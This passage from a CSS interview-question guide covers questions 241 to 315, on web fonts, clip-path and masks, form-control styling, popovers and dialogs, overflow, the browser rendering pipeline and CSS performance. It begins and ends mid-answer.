- `fallback`: hide text for about 100ms, then use the fallback. Swap only if the font loads within about 3 seconds.
- `optional`: about 100ms of hidden text. If the font isn't ready by then, keep the fallback for this page view. This means no late swaps and no layout shift.
- `auto`: the browser decides, usually like `block`.

`swap` is common for body text and `optional` is great for avoiding layout shift.

### 242: What are FOUT and FOIT, and how do you reduce them?

- **FOIT** (Flash Of Invisible Text): text is hidden until the font loads.
- **FOUT** (Flash Of Unstyled Text): text shows in the fallback font, then switches.

To reduce both:

- Preload important fonts: `<link rel="preload" href="/fonts/inter.woff2" as="font" type="font/woff2" crossorigin>`.
- Self-host WOFF2 files and subset them (fewer characters, smaller files).
- Use `font-display: swap` or `optional`.
- Adjust the fallback font's metrics to match the web font, so the swap doesn't move text around.

### 243: What are variable fonts?

A variable font is one font file that contains a whole range of styles along "axes" like weight, width and slant, instead of a separate file for each style.

```css
@font-face {
  font-family: "Inter";
  src: url("Inter-Variable.woff2") format("woff2");
  font-weight: 100 900;
}

h1 {
  font-weight: 750;
} /* any value in the range */
.custom {
  font-variation-settings:
    "wght" 650,
    "opsz" 32;
}
```

You get fewer files, smooth animation between weights, and in-between values like 550.

### 244: How do you stop layout shift when a web font loads?

Make the fallback font take up the same space as the web font, using `@font-face` descriptors:

```css
@font-face {
  font-family: "Inter Fallback";
  src: local("Arial");
  size-adjust: 107%;
  ascent-override: 90%;
  descent-override: 22%;
  line-gap-override: 0%;
}

body {
  font-family: "Inter", "Inter Fallback", sans-serif;
}
```

Next.js (`next/font`), Fontaine and Capsize can work out these values for you. `font-size-adjust` is another option. It scales fallback fonts so their x-height matches.

### 245: How do you crop an image to a shape?

Use `clip-path`. Only the part inside the shape is shown, and clicks only register inside it.

```css
.avatar {
  clip-path: circle(50%);
}
.slanted {
  clip-path: polygon(0 0, 100% 0, 100% 85%, 0 100%);
}
.inset {
  clip-path: inset(10px round 12px);
}
.custom {
  clip-path: path("M0,0 L100,0 L100,80 Q50,100 0,80 Z");
}
```

`clip-path` can be animated between shapes that have the same number of points. Newer browsers also support `shape()`, which works like `path()` but accepts CSS units and percentages, so it can be responsive.

### 246: What does `mask-image` do?

It uses an image or gradient as a mask. Opaque parts of the mask show the element, and transparent parts hide it.

```css
.fade-bottom {
  mask-image: linear-gradient(to bottom, black 70%, transparent);
}
.icon {
  background: currentColor;
  mask: url("icon.svg") center / contain no-repeat;
}
```

The second example is a common trick to color an SVG icon with `currentColor` when you can't inline the SVG. Unprefixed `mask` is Baseline since late 2023.

### 247: What does `shape-outside` do?

It makes text wrap around a shape instead of the float's rectangle.

```css
.portrait {
  float: left;
  width: 200px;
  height: 200px;
  shape-outside: circle(50%);
  clip-path: circle(50%);
  margin-right: 1rem;
}
```

It only works on floats. You can also pass an image, and its alpha channel sets the shape.

### 248: What is the difference between `filter: drop-shadow()` and `box-shadow`?

`box-shadow` follows the element's box, including its `border-radius`. `drop-shadow()` follows the real visible shape, including transparent PNG and SVG edges and `clip-path` shapes. It doesn't support `spread` or `inset`.

```css
.logo {
  filter: drop-shadow(0 2px 4px rgb(0 0 0 / 30%));
} /* follows the logo outline */
```

### 249: What do blend modes do?

`mix-blend-mode` blends an element with whatever is behind it. `background-blend-mode` blends an element's background layers with each other.

```css
.title-on-image {
  mix-blend-mode: difference;
  color: white;
}
.duotone {
  background: url("photo.jpg"), #4f46e5;
  background-blend-mode: luminosity;
}
```

The modes match the ones in Photoshop: `multiply`, `screen`, `overlay`, `difference`, `luminosity` and more.

### 250: What does `isolation: isolate` do?

It creates a new stacking context and does nothing else visually. It's used to:

- Stop `mix-blend-mode` from blending with things outside a group.
- Contain `z-index` values inside a component, so a child with `z-index: 10` can't jump above other parts of the page.

```css
.card {
  isolation: isolate;
}
.card::before {
  content: "";
  position: absolute;
  inset: 0;
  z-index: -1;
} /* stays behind the card's content, not behind the page */
```

### 251: How do CSS counters work?

Counters let CSS number things automatically.

```css
article {
  counter-reset: section;
}
article h2::before {
  counter-increment: section;
  content: counter(section) ". ";
}

/* nested numbering like 1.1, 1.2 */
ol {
  counter-reset: item;
  list-style: none;
}
ol li::before {
  counter-increment: item;
  content: counters(item, ".") " ";
}
```

`counters()` (with an "s") joins nested counters of the same name. They're used for headings, figure numbers and custom list styles.

### 252: What does `attr()` do in `content`?

It reads an HTML attribute and inserts its value as text.

```css
a[href^="http"]::after {
  content: " (" attr(href) ")";
} /* print styles */
[data-tooltip]:hover::after {
  content: attr(data-tooltip);
}
```

Traditionally it only works in `content` and only returns a string. Chromium now supports a typed `attr()` that works in any property, like `width: attr(data-width type(<length>))`, but it's not in all browsers yet.

### 253: How do you style form controls that look different in every browser?

Use `appearance: none` to remove the native look, then style them yourself.

```css
select {
  appearance: none;
  padding: 0.5rem 2rem 0.5rem 0.75rem;
  border: 1px solid #ccc;
  border-radius: 6px;
  background: url("chevron.svg") no-repeat right 0.5rem center / 1rem;
  font: inherit;
}
```

Also set `font: inherit` on buttons, inputs, selects and textareas. They don't inherit fonts by default.

### 254: How do you build a custom checkbox with CSS?

Keep the real `<input>` so keyboard and screen reader support stays. Style it with `appearance: none`.

```css
input[type="checkbox"] {
  appearance: none;
  width: 1.25rem;
  height: 1.25rem;
  border: 2px solid #555;
  border-radius: 4px;
  display: inline-grid;
  place-content: center;
}
input[type="checkbox"]::before {
  content: "";
  width: 0.65rem;
  height: 0.65rem;
  clip-path: polygon(14% 44%, 0 65%, 50% 100%, 100% 16%, 80% 0%, 43% 62%);
  background: white;
  scale: 0;
  transition: scale 120ms;
}
input[type="checkbox"]:checked {
  background: #4f46e5;
  border-color: #4f46e5;
}
input[type="checkbox"]:checked::before {
  scale: 1;
}
input[type="checkbox"]:focus-visible {
  outline: 2px solid #4f46e5;
  outline-offset: 2px;
}
```

If you only need a different color, `accent-color` is enough.

### 255: What does `field-sizing: content` do?

It makes inputs, textareas and selects grow and shrink to fit their content, with no JavaScript.

```css
textarea {
  field-sizing: content;
  min-height: 3lh;
  max-height: 12lh;
}
```

It's supported in Chromium and was added to Safari more recently. In other browsers the field just keeps its normal fixed size, which is a fine fallback.

### 256: What does `:focus-within` do?

It matches an element if the element itself or anything inside it has focus.

```css
.search:focus-within {
  border-color: #4f46e5;
  box-shadow: 0 0 0 3px rgb(79 70 229 / 25%);
}

.dropdown:focus-within .menu {
  display: block;
} /* keeps the menu open for keyboard users */
```

### 257: How do you build a floating label with CSS only?

Use `:placeholder-shown`. The input needs a placeholder, which can be a single space.

```html
<div class="field">
  <input id="email" placeholder=" " />
  <label for="email">Email</label>
</div>
```

```css
.field {
  position: relative;
}
.field label {
  position: absolute;
  left: 0.75rem;
  top: 0.75rem;
  transition:
    translate 150ms,
    scale 150ms;
  transform-origin: left top;
  pointer-events: none;
}
.field input:focus + label,
.field input:not(:placeholder-shown) + label {
  translate: 0 -1.25rem;
  scale: 0.8;
}
```

### 258: What do `:empty` and `:target` do?

- `:empty` matches elements with no children and no text. Whitespace still counts as content in browsers today, so `<p> </p>` doesn't match. Comments don't count.
- `:target` matches the element whose `id` is in the URL hash.

```css
.alert:empty {
  display: none;
}

section:target {
  outline: 2px solid orange;
  scroll-margin-top: 80px;
}
```

### 259: What does `:nth-child(An+B of S)` do?

It counts only the siblings that match selector `S`.

```css
/* zebra stripes for visible rows only */
tr:nth-child(odd of :not(.hidden)) {
  background: #f5f5f5;
}

/* the first 3 items with .featured */
li:nth-child(-n + 3 of .featured) {
  font-weight: bold;
}
```

This is different from `.featured:nth-child(-n + 3)`, which matches `.featured` items that are among the first three of all siblings. It's Baseline since 2023.

### 260: What is `::backdrop`?

It's the layer drawn behind elements in the top layer, like a modal `<dialog>` opened with `showModal()`, a popover, or an element in fullscreen.

```css
dialog::backdrop {
  background: rgb(0 0 0 / 50%);
  backdrop-filter: blur(2px);
}
```

Before 2024, `::backdrop` didn't inherit from anything, so custom properties defined on `:root` didn't work in it. It now inherits from its element, and variables work.

### 261: How do you style popovers?

The `popover` attribute puts an element in the top layer when it opens. `:popover-open` matches it while it's showing.

```html
<button popovertarget="menu">Menu</button>
<div id="menu" popover>...</div>
```

```css
[popover] {
  margin: 0;
  padding: 1rem;
  border: 1px solid #ddd;
  border-radius: 8px;
  opacity: 0;
  transition:
    opacity 200ms,
    overlay 200ms allow-discrete,
    display 200ms allow-discrete;
}
[popover]:popover-open {
  opacity: 1;
}
@starting-style {
  [popover]:popover-open {
    opacity: 0;
  }
}
```

By default a popover is centered with `position: fixed` and `inset: 0; margin: auto`. Use anchor positioning to place it next to its button.

### 262: How do you style a `<dialog>`?

```css
dialog {
  border: none;
  border-radius: 12px;
  padding: 1.5rem;
  max-width: min(90vw, 32rem);
  box-shadow: 0 20px 50px rgb(0 0 0 / 30%);
}
dialog::backdrop {
  background: rgb(0 0 0 / 40%);
}
dialog[open] {
  animation: pop 200ms ease-out;
}

@keyframes pop {
  from {
    opacity: 0;
    scale: 0.95;
  }
}

/* stop the page behind from scrolling */
html:has(dialog[open]:modal) {
  overflow: hidden;
}
```

`:modal` only matches dialogs opened with `showModal()`, not with `show()`.

### 263: How do you style `<details>` and `<summary>`?

```css
summary {
  cursor: pointer;
  list-style: none; /* hide the default triangle */
}
summary::-webkit-details-marker {
  display: none;
} /* older Safari */

summary::after {
  content: "+";
  float: right;
}
details[open] summary::after {
  content: "−";
}

details::details-content {
  /* the content area, newer browsers */
  padding-block: 0.5rem;
}
```

`::details-content` is newer (Chromium 131+ and Safari 18.4+, check Firefox support before relying on it). It lets you style and animate the content part. Adding the same `name` attribute to several `<details>` makes them work like an accordion, where only one is open at a time.

### 264: What does `table-layout: fixed` do?

With `table-layout: fixed`, column widths come from the table's width and the first row (or `<col>` elements), not from all the content. The browser can lay out the table without reading every cell, which is faster for big tables. Column widths are also predictable and long content doesn't push columns wider.

```css
table {
  table-layout: fixed;
  width: 100%;
}
th:nth-child(1) {
  width: 40%;
}
td {
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
}
```

### 265: How do you make text truncate inside a flex child?

The truncating element needs a width it can shrink to, and the flex item needs `min-width: 0`.

```css
.row {
  display: flex;
  gap: 0.5rem;
}
.row .name {
  flex: 1;
  min-width: 0;
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
}
.row .actions {
  flex-shrink: 0;
}
```

Without `min-width: 0`, the text keeps the item at its full width and the ellipsis never shows.

### 266: How does multi-column layout work?

```css
.article {
  columns: 3 250px; /* up to 3 columns, each at least 250px */
  column-gap: 2rem;
  column-rule: 1px solid #ddd;
}
.article h2 {
  column-span: all;
}
.article figure {
  break-inside: avoid;
}
```

It flows content like a newspaper, top to bottom and then into the next column. It's good for text and simple masonry-style card lists. The reading order goes down each column, which can feel odd on long pages.

### 267: Why is there a gap between `inline-block` elements?

The whitespace (line breaks and spaces) between the elements in the HTML is shown as a space character, just like spaces between words.

Fixes: use flexbox or grid for the parent (the best fix), remove the whitespace in the HTML, or set `font-size: 0` on the parent (a hack, and it breaks `em` units).

### 268: Why is there a small gap under an image?

Images are inline by default, so they sit on the text baseline. The space under them is room left for letters that hang below the line, like "g" and "p".

```css
img {
  display: block;
} /* most common fix */
img {
  vertical-align: middle;
} /* if it must stay inline */
```

### 269: Do margins collapse inside flex and grid containers?

No. Margins of flex items and grid items never collapse, either with each other or with the container. Two items with `margin: 20px` in a column flexbox have 40px between them. This is one reason people prefer `gap` for spacing inside layouts.

### 270: What can you do with negative margins?

- Pull an element outside its container: `margin-inline: -1rem` for a full-bleed image inside a padded card.
- Overlap elements, like avatars in a stack.
- Shift an element up or left. A negative top or left margin moves the element and the content after it.
- A negative bottom or right margin pulls the following content closer.

```css
.avatars img + img {
  margin-left: -12px;
}
```

They're valid CSS, but `gap`, grid and `translate` are often clearer.

### 271: Why is percentage padding based on width?

Both vertical and horizontal percentage padding are based on the **width** of the containing block. This makes the same percentage give the same space on all sides. It's also behind the old aspect-ratio hack:

```css
.ratio-16-9 {
  height: 0;
  padding-top: 56.25%; /* 9 / 16 */
  position: relative;
}
```

Today you'd use `aspect-ratio: 16 / 9` instead.

### 272: What do `min-content`, `max-content` and `fit-content` mean?

- `min-content`: the smallest size the content can have without overflowing. For text, that's the longest word.
- `max-content`: the size the content wants with no wrapping at all.
- `fit-content`: `max-content`, but no bigger than the available space. It's `min(max-content, max(min-content, available))`.

```css
.tag {
  width: fit-content;
} /* block that shrinks to its text */
.grid {
  grid-template-columns: max-content 1fr;
} /* label column as wide as the longest label */
figure {
  width: min-content;
} /* caption wraps to the image width */
```

### 273: What is the difference between `overflow: hidden` and `overflow: clip`?

Both cut off overflowing content, but:

- `hidden` makes the element a scroll container. It can still be scrolled from code, it creates a block formatting context, and it breaks `position: sticky` for descendants.
- `clip` doesn't create a scroll container, can't be scrolled at all, and doesn't break sticky.

`clip` also works with `overflow-clip-margin` to let content draw a little outside the box before it's clipped. Use `clip` when you just want to hide overflow, like decorative shapes poking out.

### 274: What is the difference between `overflow-wrap: anywhere` and `break-word`?

Both break long words that don't fit. The difference is in **min-content sizing**:

- `break-word`: the browser doesn't count these possible break points when working out min-content width. A long URL can still make a flex item or table cell as wide as the URL.
- `anywhere`: the possible breaks do count, so the container can shrink and the word breaks.

```css
.comment {
  overflow-wrap: anywhere;
}
```

### 275: How do you style SVG icons with CSS?

Inline SVG (or SVG used with `<use>`) can be styled like HTML.

```css
.icon {
  width: 1.25em;
  height: 1.25em;
  fill: currentColor; /* matches the text color */
  stroke: none;
  vertical-align: -0.2em;
}
.button:hover .icon {
  fill: #4f46e5;
}
```

SVG used as `<img>` or `background-image` can't be styled from the page. Use a CSS `mask` with `currentColor` if you need to color those.

### 276: How do you add a dark mode toggle that respects the OS setting?

Default to the OS setting, and let a class or attribute override it. With `light-dark()`, you only need to change `color-scheme`:

```css
:root {
  color-scheme: light dark; /* follow the OS by default */
  --bg: light-dark(#fff, #111);
  --text: light-dark(#111, #eee);
}
:root[data-theme="light"] {
  color-scheme: light;
}
:root[data-theme="dark"] {
  color-scheme: dark;
}

body {
  background: var(--bg);
  color: var(--text);
}
```

```js
document.documentElement.dataset.theme = "dark";
localStorage.setItem("theme", "dark");
```

Set the attribute with a small inline script in `<head>` before the page renders, or the page will flash the wrong theme.

### 277: What is `prefers-contrast`?

It tells you whether the user asked the OS for more (or less) contrast.

```css
@media (prefers-contrast: more) {
  :root {
    --text-muted: #333; /* instead of a light gray */
    --border: #000;
  }
  .button {
    border: 2px solid;
  }
}
```

It's different from `forced-colors`. With `prefers-contrast`, your colors are still used, so it's up to you to make them stronger.

### 278: How do you control page breaks when printing?

```css
@page {
  size: A4;
  margin: 2cm;
}
h2,
h3 {
  break-after: avoid;
} /* don't leave a heading alone at the bottom */
figure,
table,
pre {
  break-inside: avoid;
}
.chapter {
  break-before: page;
}
p {
  orphans: 3;
  widows: 3;
}
```

The older names `page-break-before`, `page-break-after` and `page-break-inside` still work as aliases.

### 279: How do you avoid specificity wars?

- Style with classes only. Avoid ids and long descendant chains.
- Keep selectors short and flat, as in BEM (`.card__title`, not `.sidebar .card h2`).
- Use `:where()` for base and library styles so they're easy to override.
- Use cascade layers so order, not specificity, decides which group wins.
- Keep `!important` for utilities and override cases you can't avoid.
- Scope component styles (CSS Modules, `@scope`, Shadow DOM) so they don't need to fight global ones.

### 280: What does `all: unset` do, and how is it different from `all: revert`?

`all` resets every property (except `direction` and `unicode-bidi`) at once.

- `all: unset`: inherited properties inherit, everything else goes to its initial value. A `button` becomes `display: inline` with no padding or border, and loses its focus ring.
- `all: revert`: goes back to the browser's default styles, so a `div` stays `display: block`.
- `all: revert-layer`: goes back to the value from the previous cascade layer.

```css
.reset-button {
  all: unset;
  cursor: pointer;
}
.reset-button:focus-visible {
  outline: 2px solid;
} /* add focus back */
```

### 281: What does `revert-layer` do?

It rolls a property back to the value it would have from the previous cascade layer, or from earlier origins if there is no previous layer.

```css
@layer base, theme;

@layer base {
  a {
    color: blue;
  }
}
@layer theme {
  a {
    color: purple;
  }
  .nav a {
    color: revert-layer;
  } /* back to blue from base */
}
```

It's useful in theme or component layers when you want "whatever the layer below says" for some cases.

### 282: How do you find out why a style isn't applied?

1. Inspect the element in DevTools. Make sure the selector matches it.
2. In the **Styles** pane, look for your rule. If it's crossed out, something else wins. Hover the specificity tooltip, or check the layer, to see why.
3. A yellow warning triangle means the value is invalid. An "inactive" hint (Chrome and Firefox) means the property does nothing in this context, like `width` on an inline element or `justify-content` without flex.
4. Check the **Computed** tab to see the final value and click through to the rule that set it.
5. Check that the stylesheet loaded (Network tab) and that a media or container query isn't excluding it.

### 283: How do you debug layout problems?

- Add a temporary outline to everything to see boxes without changing layout:

```css
* {
  outline: 1px solid rgb(255 0 0 / 30%);
}
```

- Use the flexbox and grid overlays in DevTools, which show tracks, gaps and line numbers.
- Look at the box model diagram to spot unexpected margins.
- Find overflow by checking which element is wider than the viewport, or use the "scroll" badge in Chrome's Elements panel.
- Turn properties on and off with their checkboxes to see which one causes the problem.

### 284: How do you chain fallbacks for custom properties?

`var()` can have another `var()` as its fallback, so you can build component-level defaults:

```css
.button {
  background: var(--button-bg, var(--color-primary, #4f46e5));
  padding: var(--button-padding, 0.5rem 1rem);
}

.hero .button {
  --button-bg: white;
}
```

The component exposes `--button-*` variables. Then it falls back to theme tokens, then to a hard-coded value. Note that the fallback can contain commas: everything after the first comma is the fallback.

### 285: What goes into a modern CSS reset?

```css
*,
*::before,
*::after {
  box-sizing: border-box;
}
* {
  margin: 0;
}
html {
  -webkit-text-size-adjust: none;
  text-size-adjust: none;
}
body {
  line-height: 1.5;
  -webkit-font-smoothing: antialiased;
}
img,
picture,
video,
canvas,
svg {
  display: block;
  max-width: 100%;
}
input,
button,
textarea,
select {
  font: inherit;
}
p,
h1,
h2,
h3,
h4,
h5,
h6 {
  overflow-wrap: break-word;
}
h1,
h2,
h3 {
  text-wrap: balance;
}
#root,
#__next {
  isolation: isolate;
}
```

Each line fixes a real annoyance: the box model, default margins, images overflowing, form controls ignoring fonts, long words overflowing, and app root stacking.

### 286: How do you manage `z-index` values in a big project?

Keep a small named scale in one place instead of random numbers:

```css
:root {
  --z-dropdown: 100;
  --z-sticky: 200;
  --z-overlay: 300;
  --z-modal: 400;
  --z-toast: 500;
}
.header {
  position: sticky;
  z-index: var(--z-sticky);
}
```

Use `isolation: isolate` on components so their inner `z-index` values stay local. Use the top layer (`<dialog>`, `popover`) for modals and popups, which removes most of the need for high `z-index` values.

### 287: How do you center an absolutely positioned element?

```css
.parent {
  position: relative;
}

/* modern */
.child {
  position: absolute;
  inset: 0;
  margin: auto;
  width: fit-content;
  height: fit-content;
}

/* classic */
.child {
  position: absolute;
  top: 50%;
  left: 50%;
  translate: -50% -50%;
}
```

The `translate` version can blur text on non-integer pixel positions. The `inset: 0; margin: auto` version doesn't have that problem.

### 288: How do you make a responsive video embed?

```css
.video-embed {
  width: 100%;
  aspect-ratio: 16 / 9;
  border: 0;
}
```

Apply this to the `<iframe>` directly. For `<video>`, use `width: 100%; height: auto;`. The browser already knows its aspect ratio from the file. If you also set `width` and `height` attributes, it knows the ratio before loading.

### 289: What is `env()` and the safe area?

`env()` reads values from the browser or device. The main use is `safe-area-inset-*` for phones with notches and home indicators.

```html
<meta
  name="viewport"
  content="width=device-width, initial-scale=1, viewport-fit=cover"
/>
```

```css
.bottom-bar {
  position: fixed;
  bottom: 0;
  padding-bottom: max(1rem, env(safe-area-inset-bottom));
}
```

Without `viewport-fit=cover`, the page doesn't go into the unsafe areas, and the values are 0.

### 290: What does `touch-action` do?

It tells the browser which touch gestures it should handle itself, like scrolling and pinch-zoom, so your JavaScript can handle the rest.

```css
.map {
  touch-action: none;
} /* JS handles all gestures */
.carousel {
  touch-action: pan-y;
} /* browser scrolls vertically, JS handles horizontal swipe */
button {
  touch-action: manipulation;
} /* no double-tap zoom */
```

### 291: What does `user-select` do?

It controls whether the user can select text.

```css
.button,
.tab {
  user-select: none;
} /* no accidental selection on double-click */
.code-snippet {
  user-select: all;
} /* one click selects everything */
```

Don't disable selection on content people may want to copy. Safari still needs `-webkit-user-select` in some versions.

### 292: What is the difference between `:root` and `html`?

In an HTML document they match the same element. The difference is specificity: `:root` is a pseudo-class (0,1,0) and `html` is a type selector (0,0,1). `:root` also works in other documents like SVG and XML. By convention, global custom properties go on `:root`.

### 293: When should you use a container query and when a media query?

- **Media queries** are for things about the page or the device: page layout, user settings (`prefers-*`), print, and input type (`hover`, `pointer`).
- **Container queries** are for reusable components that may appear in spaces of different widths, like a card that shows in a sidebar and in a main column.

A good rule: page layout uses media queries, and components use container queries.

### 294: How do you make a responsive grid of cards without media queries?

```css
.cards {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(min(16rem, 100%), 1fr));
  gap: 1.5rem;
}
```

Columns appear and disappear on their own as space allows. `min(16rem, 100%)` stops overflow on very small screens. Use `auto-fit` if you want a few items to stretch across the full row.

### 295: How do you build a full-bleed section inside a centered layout?

The grid version, with named lines:

```css
.layout {
  display: grid;
  grid-template-columns:
    [full-start] minmax(1rem, 1fr)
    [content-start] minmax(0, 65ch) [content-end]
    minmax(1rem, 1fr) [full-end];
}
.layout > * {
  grid-column: content;
}
.layout > .full-bleed {
  grid-column: full;
}
```

A quick version with no grid:

```css
.full-bleed {
  width: 100vw;
  margin-inline: calc(50% - 50vw);
}
```

The second version can cause a horizontal scrollbar on desktop, because `100vw` includes the vertical scrollbar.

### 296: How do you write a "stack" layout that adds space between children?

```css
/* modern: flex with gap */
.stack {
  display: flex;
  flex-direction: column;
  gap: var(--space, 1rem);
}

/* "lobotomized owl", which also works in normal flow */
.flow > * + * {
  margin-block-start: var(--flow-space, 1em);
}
```

`* + *` matches every child except the first one, so you never get extra space at the top or bottom.

### 297: How do you make equal-height columns?

This comes for free in flexbox and grid. Items stretch to the height of the row by default (`align-items: stretch`).

```css
.columns {
  display: flex;
  gap: 1rem;
}
.columns > * {
  flex: 1;
}
```

To make the parts inside each card line up too (like titles and buttons), use `subgrid` or make each card a column flexbox with `margin-top: auto` on the footer.

### 298: How do you add a skip link?

```css
.skip-link {
  position: absolute;
  left: 1rem;
  top: -100px;
  padding: 0.5rem 1rem;
  background: #000;
  color: #fff;
  z-index: 1000;
}
.skip-link:focus {
  top: 1rem;
}
```

```html
<a class="skip-link" href="#main">Skip to content</a>
```

It's hidden until a keyboard user tabs to it. Then it appears and lets them jump past the navigation.

### 299: How do you style based on the number of children?

Combine `:nth-child` and `:nth-last-child` (quantity queries), or use `:has()`.

```css
/* exactly 3 items */
li:first-child:nth-last-child(3),
li:first-child:nth-last-child(3) ~ li {
  width: 33%;
}

/* grid with 5 or more items gets more columns */
.grid:has(> :nth-child(5)) {
  grid-template-columns: repeat(3, 1fr);
}
```

The `:has()` version is much easier to read.

### 300: What do `text-underline-offset` and `text-decoration-thickness` do?

They give you control over underlines without using `border-bottom`.

```css
a {
  text-decoration: underline;
  text-decoration-thickness: 2px;
  text-underline-offset: 0.2em;
  text-decoration-color: rgb(79 70 229 / 40%);
  transition: text-decoration-color 150ms;
}
a:hover {
  text-decoration-color: currentColor;
}
```

`text-decoration-skip-ink: auto` (the default) breaks the line around letters that go below it, like "g" and "y".

## Advanced Questions (301-450)

### 301: Why is CSS render-blocking?

The browser won't paint anything until it has downloaded and parsed all the CSS in `<head>`. If it painted earlier, users would see unstyled content that then jumps around (FOUC). CSS also blocks scripts that come after it: a script might read styles with `getComputedStyle`, so the browser waits for the CSS before running it.

This is why CSS size and the number of CSS requests matter so much for First Contentful Paint and Largest Contentful Paint. Stylesheets with a `media` attribute that doesn't match (like `media="print"`) are still downloaded, but they don't block rendering.

### 302: What is the CSSOM?

The CSS Object Model is the browser's tree of parsed style rules, built from every stylesheet and `<style>` block. The browser combines the DOM and the CSSOM to work out the computed style of each element, then builds the render tree used for layout and paint.

JavaScript can read and change the CSSOM through `document.styleSheets`, `CSSStyleSheet.insertRule()`, `element.style` and `getComputedStyle()`.

### 303: Why do browsers match selectors from right to left?

The browser starts with an element and asks "which rules match this element?". It checks the rightmost part (the key selector) first, because most rules fail right there, and only walks up the tree if needed.

For `.sidebar nav ul li a`, the browser checks "is this an `a`?". Only for `a` elements does it walk up looking for `li`, `ul`, `nav` and `.sidebar`. Browsers also use rule hashing by id, class and tag, plus Bloom filters for ancestors, so most rules are skipped without being checked at all.

### 304: Does selector performance matter in practice?

Rarely, for normal pages. Modern engines are very fast at matching. Real style performance problems usually come from:

- A very large DOM (tens of thousands of elements).
- Style changes that make the browser recalculate styles for big parts of the page, like toggling a class on `body` that many selectors depend on.
- Expensive selectors that are checked again on every change, like broad `:has()` on the root, or `:nth-child` in huge lists.

Use the Performance panel to measure "Recalculate Style" time before you optimise selectors. Chrome's "selector stats" option shows which selectors cost the most.

### 305: What are the steps of the rendering pipeline?

1. **Style**: work out the computed style of every element from the DOM and the CSSOM.
2. **Layout**: work out the size and position of every box.
3. **Paint**: record draw commands for text, colors, borders, shadows and images.
4. **Composite**: split the page into layers, rasterize them (often on the GPU) and put them together on screen.

A change to a property starts the pipeline at some step and runs everything after it. Changing `width` causes layout, paint and composite. Changing `color` causes paint and composite. Changing `transform` or `opacity` on an element with its own layer can skip straight to composite.

### 306: What is layout thrashing?

Layout thrashing happens when JavaScript writes styles and then reads layout values again and again in a loop. Each read forces the browser to do layout right away (a forced synchronous layout).

```js
// bad: read and write in turns, layout runs on every loop
items.forEach((el) => {
  el.style.width = el.parentElement.offsetWidth / 2 + "px";
});

// good: read everything first, then write
const widths = items.map((el) => el.parentElement.offsetWidth);
items.forEach((el, i) => {
  el.style.width = widths[i] / 2 + "px";
});
```

Properties that force layout include `offsetWidth`, `offsetTop`, `getBoundingClientRect()`, `scrollTop` and `getComputedStyle()` for layout values. Libraries like FastDOM batch reads and writes for you. In the Performance panel, look for purple "Layout" blocks with a "Forced reflow" warning.

### 307: Which property changes trigger layout, paint or only composite?

- **Layout** (most expensive): `width`, `height`, `margin`, `padding`, `top`/`left`, `font-size`, `display`, `position`, `border-width`, and changing text content.
- **Paint only**: `color`, `background-color`, `background-image`, `box-shadow`, `border-radius`, `outline`, `visibility`.
- **Composite only** (cheapest, when the element has its own layer): `transform`, `opacity`, and often `filter`.

The exact behavior differs between engines. Test with DevTools paint flashing and the Performance panel instead of trusting a list.

### 308: What are compositor layers and what does promoting an element cost?

The browser can draw some elements into their own layer (a bitmap held in GPU memory), so moving or fading them doesn't repaint anything else. Elements get their own layer when they have 3D transforms, `will-change: transform`, active `transform` or `opacity` animations, `<video>`, `<canvas>`, and so on.

The cost: each layer uses memory (width × height × 4 bytes, times the device pixel ratio squared). Too many layers ("layer explosion") can use hundreds of MB on a phone and make compositing slow. Check the Layers panel in DevTools for how many layers there are and why each one was created.

### 309: What does the `contain` property do?

`contain` tells the browser that an element's inside is independent from the rest of the page, so it can skip work.

- `layout`: inside layout doesn't affect outside layout. It also creates a stacking context and a containing block.
- `paint`: children aren't painted outside the box (like `overflow: clip`).
- `size`: the element's size doesn't depend on its children. You must give it a size.
- `inline-size`: the same, only for the inline axis.
- `style`: counters and quotes don't leak out.
- `content` = `layout paint style`. `strict` = `size layout paint style`.

```css
.widget {
  contain: content;
}
```

It's most useful for widgets that update often, like chat lists and dashboards, because a change inside doesn't make the browser recalculate the whole page.

### 310: What does `content-visibility: auto` do?

It lets the browser skip style, layout and paint for an element's contents while the element is off-screen. It renders them when they come close to the viewport.

```css
.article-section {
  content-visibility: auto;
  contain-intrinsic-size: auto 800px;
}
```

`contain-intrinsic-size` gives a placeholder size so the scrollbar doesn't jump. The `auto` keyword makes the browser remember the real size after it renders the section once. On long pages this can cut initial render time a lot.

Things to watch: find-in-page and anchor links still work. Off-screen content is still in the accessibility tree. Scroll position can jump if the placeholder size is far from the real size. It's Baseline since 2024.

### 311: What is critical CSS?

Critical CSS is the small part of your styles needed to render the above-the-fold content. You inline it in a `<style>` tag in `<head>` and load the rest without blocking.

```html
<head>
  <style>
    /* critical rules: header, hero, layout */
  </style>
  <link rel="preload" href="/main.css" as="style" />
  <link
    rel="stylesheet"
    href="/main.css"
    media="print"
    onload="this.media='all'"
  />
  <noscript><link rel="stylesheet" href="/main.css" /></noscript>
</head>
```

The first paint happens with no extra request. The cost is the build complexity of picking out the critical rules (tools: Critters/Beasties, Penthouse) and the fact that inlined CSS isn't cached. It helps most on slow networks and when the full CSS is big.

### 312: How does the `media="print" onload` trick work?

A stylesheet with a media query that doesn't match is downloaded at low priority and doesn't block rendering. When it has loaded, the `onload` handler switches `media` to `all`, and the styles apply.

```html
<link
  rel="stylesheet"
  href="non-critical.css"
  media="print"
  onload="this.media='all'"
/>
```

The `<noscript>` fallback is needed for users with JavaScript turned off. A strict Content Security Policy that blocks inline event handlers will block this `onload`, so you may need a small external script instead.

### 313: How do you find and remove unused CSS?

- **Chrome DevTools Coverage tab** shows which bytes of each stylesheet were used during a session. Click through the main flows first, because a rule unused on the home page may be used elsewhere.
- **Build tools**: PurgeCSS scans your templates for class names. Tailwind only generates classes it finds in your files. CSS Modules and component-scoped styles let unused CSS disappear when the component is deleted.
- **Lint and code search**: Stylelint, plus searching the codebase for class names.

Be careful with class names built dynamically (`"btn-" + variant`), which scanners can't see. Safelist them.

### 314: How can CSS cause layout shift (CLS)?

- Images and embeds without a set size. Use `width`/`height` attributes or `aspect-ratio`.
- Web fonts swapping in with different metrics. Use `size-adjust` and the override descriptors, or `font-display: optional`.
- Late-loading CSS that changes layout after the first paint.
- Content inserted above existing content (banners, ads) without reserved space.
- Animating layout properties like `top` or `height`. Use `transform` instead, which doesn't count toward CLS.
- Scrollbars appearing and pushing content. Use `scrollbar-gutter: stable`.

### 315: How can CSS slow down LCP?

- Large render-blocking stylesheets, or `@import` chains, delay the first paint.
